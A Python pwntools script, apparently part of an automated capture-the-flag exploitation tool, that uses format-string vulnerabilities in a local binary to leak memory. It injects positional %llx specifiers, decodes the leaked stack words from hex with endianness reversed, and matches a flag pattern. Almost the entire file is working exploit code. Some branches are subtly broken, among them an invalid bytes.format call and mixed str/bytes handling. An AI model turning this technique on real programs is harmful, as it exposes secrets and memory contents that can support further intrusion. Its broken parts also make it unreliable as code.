import binascii
import re
import string
import typing

from pwn import *


def checkLeak(binary_name, properties, leak_format) -> bytes:
    full_string = b""
    run_count = 50

    # Should have plenty of _%x_ in string
    base_input_string = properties["pwn_type"]["input"]

    format_specifier = b"lx"
    if "amd64" in properties["protections"]["arch"]:
        format_specifier = b"llx"

    format_count = base_input_string.count(b"_%" + format_specifier)

    for i in range(int(run_count / format_count) + 1):
        input_string = base_input_string

        if (
            properties["input_type"] == "STDIN"
            or properties["input_type"] == "LIBPWNABLE"
        ):
            # Create a local process
            proc = process(binary_name)

            # Swap in values for every _%x
            for j in range(format_count):
                iter_num = (i * format_count) + j
                iter_byte = str(iter_num).encode()
                input_string = input_string.replace(
                    b"_%" + format_specifier,
                    b"_%" + iter_byte + b"$" + format_specifier,
                    1,
                )

            print("[+] Sending input {}".format(input_string))
            proc.sendline(input_string)

            results = proc.recvall(timeout=5)

            """
            1. Split data by '_'
            2. Filter by hexdigits
            3. flip bytes for endianess
            4. hex to ascii converstion
            """
            data_leaks = results.split(b"_")
            # data_leaks = [
            #     x[0:8] if all([y in string.hexdigits.encode() for y in x]) else b""
            #     for x in data_leaks
            # ]
            # Swap endianess
            data_leaks = [
                b"".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
                for y in data_leaks
            ]
            try:
                data_copy = data_leaks
                print(data_copy)
                data_leaks = [binascii.unhexlify(x.decode()) for x in data_leaks]
            except binascii.Error:
                print("[~] Odd length string detected... Skipping")
                temp_data = []
                for x in data_copy:
                    try:
                        temp_data.append(binascii.unhexlify(x.decode()))
                    except:
                        print("[+] Bad chunk {}".format(x))

                data_leaks = temp_data
            print(data_leaks)
            full_string += b"".join(data_leaks)

            # Only return printable ASCII
            print(b"".join([x.to_bytes(1, "little") for x in full_string]))
            full_string = b"".join(
                [
                    x.to_bytes(1, "little")
                    if x.to_bytes(1, "little") in string.printable.encode()
                    else b""
                    for x in full_string
                ]
            )
        else:
            # Swap in values for every _%x
            for j in range(format_count):
                iter_num = (i * format_count) + j
                input_string = input_string.replace(
                    b"_%x", b"_%{}$".format(iter_num) + format_specifier, 1
                ).rstrip("\x00")

            # Create local or remote process
            proc = process([binary_name, input_string])

            # print("[+] Sending input {}".format(input_string))
            # proc.sendline(input_string)

            results = proc.recvall(timeout=5)

            # 1. Split data by '_'
            # 2. Filter by hexdigits
            # 3. flip bytes for endianess
            # 4. hex to ascii converstion
            data_leaks = results.split(b"_")
            data_leaks = [
                x[0:8] if all([y in string.hexdigits for y in x]) else b""
                for x in data_leaks
            ]
            data_leaks = [
                b"".join([y[x : x + 2] for x in range(0, len(y), 2)][::-1])
                for y in data_leaks
            ]
            data_leaks = [binascii.unhexlify(x) for x in data_leaks]

            full_string += b"".join(data_leaks)

            # Only return printable ASCII
            full_string = b"".join(
                [x if x in string.printable else b"" for x in full_string]
            )

        # Dumb check for finding flag
        if re.match(leak_format, full_string):
            print("[+] Flag found:")
            print(f"[+] Returned {full_string}")

            return input_string

    return None
